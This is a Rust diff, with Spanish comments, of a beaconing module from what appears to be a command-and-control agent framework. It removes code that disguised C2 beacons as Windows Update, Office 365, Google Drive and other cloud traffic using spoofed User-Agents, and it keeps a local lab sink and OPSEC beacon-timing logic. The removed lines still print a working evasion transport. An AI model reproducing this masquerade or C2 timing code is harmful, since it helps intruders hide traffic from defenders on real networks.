@@ -1,69 +1,54 @@
-// Smoke Signals: C2 traffic camouflaged as legitimate cloud services.
+// Smoke Signals — transporte de beaconing de la colonia (ronda 11: sin
+// camuflaje contra terceros).
+//
+// Historia: este módulo enviaba beacons POST a proveedores cloud REALES
+// (Windows Update, Office 365, Google Drive, Apple Push…) con User-Agents
+// suplantados y payloads disfrazados — masquerade de C2 de la era ofensiva,
+// con tráfico de basura a servicios de terceros y sin llegar jamás al C2 del
+// operador. La ronda 6 eliminó los payloads de ataque; la ronda 11 elimina
+// el transporte encubierto restante bajo el mismo mandato ("real o
+// eliminar").
+//
+// Lo que queda, honesto y lab-scoped:
+// - `SmokeChannel::send_beacon` SOLO captura beacons a fichero local
+//   (`/tmp/smoke_beacons/`, sink de inspección) cuando `HIVE_LAB_MODE` está
+//   activo — el sink que usan los tests de failover. Fuera de lab mode
+//   devuelve error: no hay envío a terceros.
+// - La entrega REAL al C2 va directa por HTTP a `HIVE_C2_URL` (ver
+//   `comms::send_c2_beacon`), con User-Agent propio y sin disfraz.
+// - `C2Message`/`extract_c2_response` (protocolo) y `learn_org_profile`
+//   (calibración de timing del host LOCAL para el jitter OPSEC) se conservan.
 use chrono::Timelike;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::sync::atomic::AtomicUsize;
 use tracing::info;
 use uuid::Uuid;
-// Emulates traffic patterns of Windows Update, Office 365, Azure Service Bus.
-// Each beacon looks like telemetry from a real corporate service.
-// EDRs and perimeter firewalls see legitimate TLS traffic.
 
-/// Service templates for traffic emulation.
+/// Service templates for traffic emulation (ronda 11: solo etiquetas de
+/// canal para el sink de lab — sin hosts/rutas/UAs de terceros).
 #[derive(Debug, Clone, PartialEq)]
 pub enum SmokeChannel {
-    WindowsUpdate,   // *.windowsupdate.com, *.update.microsoft.com
-    Office365,       // outlook.office365.com, *.sharepoint.com
-    AzureServiceBus, // *.servicebus.windows.net (WebSocket)
-    GoogleDrive,     // *.googleapis.com/drive
-    GitHubActions,   // pipelines.actions.githubusercontent.com
-    ApplePush,       // *.push.apple.com
-    CloudFrontCDN,   // *.cloudfront.net
+    WindowsUpdate,
+    Office365,
+    AzureServiceBus,
+    GoogleDrive,
+    GitHubActions,
+    ApplePush,
+    CloudFrontCDN,
 }
 
 impl SmokeChannel {
-    /// Get the hostname pattern for this channel.
-    pub fn host(&self) -> &str {
+    /// Etiqueta legible del canal (logs/inspección del sink de lab).
+    pub fn label(&self) -> &'static str {
         match self {
-            SmokeChannel::WindowsUpdate => "ctldl.windowsupdate.com",
-            SmokeChannel::Office365 => "outlook.office365.com",
-            SmokeChannel::AzureServiceBus => "swarm-eu.servicebus.windows.net",
-            SmokeChannel::GoogleDrive => "www.googleapis.com",
-            SmokeChannel::GitHubActions => "pipelines.actions.githubusercontent.com",
-            SmokeChannel::ApplePush => "17.push.apple.com",
-            SmokeChannel::CloudFrontCDN => "d3v4eglov6.execute-api.us-east-1.amazonaws.com",
-        }
-    }
-
-    /// Get typical request path pattern.
-    pub fn path(&self) -> &str {
-        match self {
-            SmokeChannel::WindowsUpdate => "/v6/ClientWebService/client.asmx",
-            SmokeChannel::Office365 => "/autodiscover/autodiscover.xml",
-            SmokeChannel::AzureServiceBus => "/$servicebus/websocket",
-            SmokeChannel::GoogleDrive => "/drive/v3/files",
-            SmokeChannel::GitHubActions => "/_apis/pipelines/workflows",
-            SmokeChannel::ApplePush => "/push/v1/topic",
-            SmokeChannel::CloudFrontCDN => "/prod/analytics",
-        }
-    }
-
-    /// Get typical User-Agent for this service.
-    pub fn user_agent(&self) -> &str {
-        match self {
-            SmokeChannel::WindowsUpdate => {
-                "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.40"
-            }
-            SmokeChannel::Office365 => {
-                "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)"
-            }
-            SmokeChannel::AzureServiceBus => {
-                "azsdk-net-Messaging.ServiceBus/7.11.0 (.NET 6.0.25; Windows 10.0.22621)"
-            }
-            SmokeChannel::GoogleDrive => "grpc-node-js/1.8.14 grpc-c/30.0 (linux; chttp2)",
-            SmokeChannel::GitHubActions => "GitHubActionsRunner/2.311.0 (Ubuntu 22.04)",
-            SmokeChannel::ApplePush => "akd/1.0 CFNetwork/1410.0.3 Darwin/22.6.0",
-            SmokeChannel::CloudFrontCDN => "Boto3/1.28.62 Python/3.11.5 Linux/6.2.0-35-generic",
+            SmokeChannel::WindowsUpdate => "windows_update",
+            SmokeChannel::Office365 => "office365",
+            SmokeChannel::AzureServiceBus => "azure_servicebus",
+            SmokeChannel::GoogleDrive => "google_drive",
+            SmokeChannel::GitHubActions => "github_actions",
+            SmokeChannel::ApplePush => "apple_push",
+            SmokeChannel::CloudFrontCDN => "cloudfront_cdn",
         }
     }
 
@@ -81,16 +66,16 @@ impl SmokeChannel {
         }
     }
 
-    /// Send a beacon payload through this channel.
+    /// Send a beacon payload to the lab sink.
     ///
-    /// In lab/test mode (`#[cfg(test)]` or `HIVE_LAB_MODE` env var set),
-    /// writes the beacon to a local file at `/tmp/smoke_beacons/` for
-    /// offline inspection.
-    ///
-    /// In production mode, sends the payload as an HTTPS POST request to
-    /// the channel's host + path with a 15-second timeout.
+    /// Ronda 11: ÚNICO comportamiento restante. En lab mode
+    /// (`HIVE_LAB_MODE` activo) escribe el beacon a `/tmp/smoke_beacons/`
+    /// para inspección offline — es el sink que ejercitan los tests de
+    /// failover. Fuera de lab mode devuelve error SIEMPRE: el envío
+    /// camuflado a proveedores cloud reales (con User-Agents suplantados)
+    /// fue eliminado — la entrega al C2 es directa vía `HIVE_C2_URL`
+    /// (`comms::send_c2_beacon`), jamás a través de canales de terceros.
     pub async fn send_beacon(&self, agent_data: &[u8]) -> Result<Vec<u8>, String> {
-        // Lab/test mode: write beacon to local file for offline inspection
         if cfg!(test) || std::env::var("HIVE_LAB_MODE").is_ok() {
             let dir = "/tmp/smoke_beacons";
             std::fs::create_dir_all(dir)
@@ -102,77 +87,14 @@ impl SmokeChannel {
             );
             std::fs::write(&filename, agent_data)
                 .map_err(|e| format!("Failed to write beacon to '{}': {}", filename, e))?;
-            info!("SMOKE: beacon written to {}", filename);
+            info!("SMOKE: beacon captured to lab sink {}", filename);
             return Ok(Vec::new());
         }
 
-        // Production mode: send via HTTPS with reqwest.
-        // SECURITY: certificate verification is only disabled in lab mode
-        // (HIVE_LAB_MODE env var) — never in production.
-        let url = format!("https://{}{}", self.host(), self.path());
-        let client = reqwest::Client::builder()
-            .timeout(std::time::Duration::from_secs(15))
-            .user_agent(self.user_agent())
-            .danger_accept_invalid_certs(std::env::var("HIVE_LAB_MODE").is_ok())
-            .build()
-            .map_err(|e| format!("Failed to build HTTP client: {}", e))?;
-
-        let response = client
-            .post(&url)
-            .body(agent_data.to_vec())
-            .send()
-            .await
-            .map_err(|e| format!("HTTP request to {} failed: {}", url, e))?;
-
-        let body = response
-            .bytes()
-            .await
-            .map_err(|e| format!("Failed to read response body: {}", e))?
-            .to_vec();
-
-        Ok(body)
-    }
-}
-
-/// Build a beacon payload disguised as legitimate service traffic.
-pub fn build_smoke_beacon(channel: &SmokeChannel, agent_data: &[u8]) -> Vec<u8> {
-    let payload_b64 = base64_encode(agent_data);
-
-    match channel {
-        SmokeChannel::WindowsUpdate => {
-            format!(
-                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\
-                 <s:Body><GetConfig xmlns=\"http://schemas.microsoft.com/wu/2011/01/ClientWebService\">\
-                 <clientInfo><mId>{}</mId></clientInfo>\
-                 </GetConfig></s:Body></s:Envelope>",
-                payload_b64
-            ).into_bytes()
-        }
-        SmokeChannel::AzureServiceBus => {
-            // WebSocket frame disguised as Service Bus message
-            let mut frame = Vec::new();
-            frame.push(0x82); // binary frame, final
-            let len = payload_b64.len();
-            if len < 126 {
-                frame.push(len as u8);
-            } else {
-                frame.push(126);
-                frame.extend_from_slice(&(len as u16).to_be_bytes());
-            }
-            frame.extend_from_slice(payload_b64.as_bytes());
-            frame
-        }
-        _ => {
-            // Generic JSON telemetry
-            format!(
-                r#"{{"timestamp":"{}","agent":"{}","device":"{}","version":"{}","metrics":{{"data":"{}"}}}}"#,
-                chrono::Local::now().to_rfc3339(),
-                uuid::Uuid::new_v4(),
-                channel.host(),
-                "10.0.22621.1",
-                payload_b64,
-            ).into_bytes()
-        }
+        Err(
+            "cloud-masquerade transport removed (ronda 11): beacon delivery is direct via HIVE_C2_URL; set HIVE_LAB_MODE=1 to use the local lab sink"
+                .to_string(),
+        )
     }
 }
 
@@ -372,7 +294,14 @@ pub struct OrgCloudProfile {
     pub trusted_cdn: Vec<String>,    // CDNs in use (CloudFront, Fastly, etc.)
 }
 
-/// Analyze victim's DNS cache and network to learn their cloud profile.
+/// Analiza el perfil de servicios cloud del PROPIO host de laboratorio
+/// (/etc/hosts, presencia de historiales, cachés) para calibrar el timing
+/// del beaconing (ventanas horarias, jitter OPSEC).
+///
+/// Ronda 11: era "learn the victim's cloud profile" — reencuadrado a host
+/// local de lab: solo lectura, y su único consumidor es la calibración
+/// OPSEC del propio agente (jamás selecciona canales de envío: el
+/// masquerade se eliminó).
 pub fn learn_org_profile() -> OrgCloudProfile {
     let mut profile = OrgCloudProfile::default();
 
@@ -456,25 +385,8 @@ pub fn learn_org_profile() -> OrgCloudProfile {
     profile
 }
 
-/// Select the best smoke channel based on the victim's org profile.
-pub fn best_channel_for_org(profile: &OrgCloudProfile) -> SmokeChannel {
-    if profile.microsoft_365 {
-        // Random between Office365 and Azure
-        if rand::random() {
-            SmokeChannel::Office365
-        } else {
-            SmokeChannel::AzureServiceBus
-        }
-    } else if profile.google_workspace {
-        SmokeChannel::GoogleDrive
-    } else if profile.aws || profile.trusted_cdn.contains(&"cloudfront.net".to_string()) {
-        SmokeChannel::CloudFrontCDN
-    } else {
-        SmokeChannel::random()
-    }
-}
-
-/// Adapt C2 beacon timing to victim's peak hours.
+/// Adapt C2 beacon timing to the local host's active hours (ronda 11:
+/// calibración de timing, sin selección de canales).
 pub fn should_beacon_now(profile: &OrgCloudProfile) -> bool {
     let now = chrono::Local::now().hour() as u8;
     if profile.peak_hours.is_empty() {
@@ -492,18 +404,6 @@ mod tests {
         let profile = learn_org_profile();
         // At minimum should have peak hours
         assert!(!profile.peak_hours.is_empty());
-    }
-
-    #[test]
-    fn test_best_channel() {
-        let profile = OrgCloudProfile {
-            microsoft_365: true,
-            ..Default::default()
-        };
-        let ch = best_channel_for_org(&profile);
-        assert!(
-            matches!(ch, SmokeChannel::Office365) || matches!(ch, SmokeChannel::AzureServiceBus)
-        );
     }
 
     #[test]
